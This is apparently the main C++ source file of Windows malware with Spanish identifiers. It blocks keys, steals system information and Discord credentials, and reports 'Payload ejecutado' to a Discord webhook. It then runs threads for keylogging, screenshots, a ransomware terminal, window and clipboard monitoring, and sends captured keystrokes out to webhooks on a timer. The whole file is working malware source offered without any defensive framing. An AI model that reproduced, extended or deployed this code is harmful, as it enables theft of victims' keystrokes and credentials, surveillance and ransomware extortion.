#include <windows.h>
#include <string>
#include <thread>
#include <chrono>
#include <sstream>
#include <atomic>

#include "config.h"
#include "contadores.h"
#include "discord.h"
#include "keylogger.h"
#include "screenshots.h"
#include "ransomware_terminal.h"
#include "systeminfo.h"
#include "windowmonitor.h"
#include "credentials.h"
#include "graffiti.h"
#include "blockkeys.h"
#include "clipboard.h"

std::atomic<int> g_teclas_totales{0};
std::atomic<int> g_capturas_totales{0};
std::atomic<int> g_archivos_totales{0};


static void HiloEnvioTeclas() {
    while (true) {
        Sleep(INTERVALO_ENVIO_TECLAS_MS);
        std::wstring teclas = ObtenerBufferTeclas();
        if (!teclas.empty()) {
            std::wstring msg = L"⌨️ ```" + teclas + L"```";
            DiscordEnviarTexto(WEBHOOK_TECLAS, msg);
        }
        g_teclas_totales = g_teclas_contador.load();
    }
}

static void HiloInforme() {
    while (true) {
        Sleep(INTERVALO_INFORME_MS);

        SYSTEMTIME st;
        GetLocalTime(&st);

        wchar_t hostname[256]; DWORD size = 256;
        GetComputerNameW(hostname, &size);

        std::wstringstream ss;
        ss << L"📊 **INFORME**\n"
           << L"📅 `" << st.wYear << L"-" << st.wMonth << L"-" << st.wDay
           << L" " << st.wHour << L":" << st.wMinute << L"`\n"
           << L"🖥️ Host: `" << hostname << L"`\n"
           << L"📈 Teclas: **" << g_teclas_totales.load() << L"**\n"
           << L"📸 Capturas: **" << g_capturas_totales.load() << L"**\n"
           << L"📁 Archivos: **" << g_archivos_totales.load() << L"**";

        DiscordEnviarTexto(WEBHOOK_INFORME, ss.str());
    }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {

    IniciarBloqueoTeclas();          // ← NUEVO

    EnviarInfoSistemaCompleta();
    EnviarCredencialesDiscord();

    wchar_t hostname[256]; DWORD size = 256;
    GetComputerNameW(hostname, &size);
    DiscordEnviarTexto(WEBHOOK_ALERTAS,
        L"🚀 **Payload ejecutado** en `" + std::wstring(hostname) + L"`");

    IniciarKeylogger();

    std::thread(HiloEnvioTeclas).detach();
    std::thread(HiloInforme).detach();
    std::thread(HiloScreenshots).detach();
    std::thread(HiloRansomwareTerminal).detach();
    std::thread(HiloMonitorVentanas).detach();
    std::thread(HiloClipboard).detach();

    while (true) Sleep(60000);
    return 0;
}